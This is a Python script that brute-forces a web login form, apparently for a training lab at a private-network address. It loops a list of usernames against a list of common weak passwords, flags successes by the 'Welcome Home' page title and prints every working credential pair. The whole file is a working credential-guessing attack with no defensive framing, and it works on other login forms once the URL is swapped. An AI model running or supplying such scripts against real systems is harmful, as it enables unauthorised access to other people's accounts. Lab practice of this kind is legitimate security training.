import requests
import json
from requests.sessions import Session

url = "http://192.168.15.205/Decamp/Chapter6/lab2/login.php"

# Create a session object to persist cookies
session = Session()

# Explicitly set the header if needed (usually not necessary for x-www-form-urlencoded)
headers = {
    'Content-Type': 'application/form-data'
}

# Example lists of usernames and passwords
usernames = [
    "Elchen_2", "el_chocle", "ElChuckyneitor", "ElCidCrafteador", "elconin",
    "ElConquistador", "elcoolion", "ElCorko", "elcrafteur", "El_Crafto",
    "ElCrisco", "ElCristo8", "elCZstrickey", "eld", "elda",
    "eldaelden", "elDanXD", "elda_oromis", "eldar", "eldenelder",
    "eldenker", "elder", "Elder", "Elder1", "ElderAidsMage",
    "Elderand", "entitle", "entity", "entity0x", "entity_303",
    "Entity303", "EntityBean", "ento", "ENTO22", "entoan",
    "entoblast", "entoderm", "entoil", "entomb", "entomo",
    "entomologize", "entomology", "entomophagous", "entomophilous", "entomostracan",
    "EnToony", "entophyte", "entopic", "entourage", "entozoic",
    "entozoon", "entr", "entrails", "entrain", "entrammel",
    "entrance", "EntrancedCape5", "entranceway", "entrant", "entrap",
    "entreat", "entreaty", "entrechat", "entree", "gastrin",
    "gastritis", "gastro", "gastrocnemius", "gastroenteritis", "gastroenterology",
    "gastroenterostomy", "gastrointestinal", "gastrolith", "gastrolizard", "gastrology",
    "Gastronam", "gastronome", "gastronomy", "gastropod", "gastroscope",
    "gastrostomy", "gastrotomy", "gastrotrich", "gastrovascular", "gastrula",
    "gastrulation", "gasts", "gasttest", "gastuser", "Gasuros",
    "gasworks", "Gasyboy", "Gasymexican", "gat", "Gatanater",
    "Gatchi"
]

passwords = [
    "amanda", "bear", "frank", "brazil", "baseball", "wizard", "tiger", "hannah",
    "lauren", "master", "xxxxxxxx", "doctor", "dave", "japan", "michael", "money",
    "gateway", "eagle1", "naked", "football", "phoenix", "gators", "11111", "squirt",
    "shadow", "mickey", "angel", "mother", "stars", "monkey", "bailey", "junior",
    "nathan", "apple", "abc123", "knight", "thx1138", "raiders", "alexis", "pass",
    "iceman", "porno", "steve", "aaaa", "fuckme", "tigers", "badboy", "forever", "bonnie"
]

successful_logins = []

for username in usernames:
    for password in passwords:
        data = {
            "username": username,
            "password": password,
            "submit": "Login"
        }
        # Send the POST request with the form data
        response = session.post(url, data, headers)
        
        # Checking for a specific pattern in the response to indicate successful login
        if "<title>Welcome Home" in response.text:
            print(f"Success with username: {username} and password: {password}")
            # Optionally, break out of the loop or perform additional actions upon success
            successful_logins.append((username, password))
        else:
            print(f"Failed attempt with username: {username} and password: {password}")

# Print all successful login combinations at the end
if successful_logins:
    print("\nSuccessful login combinations found:")
    for username, password in successful_logins:
        print(f"Username: {username}, Password: {password}")
else:
    print("No successful login combinations found.")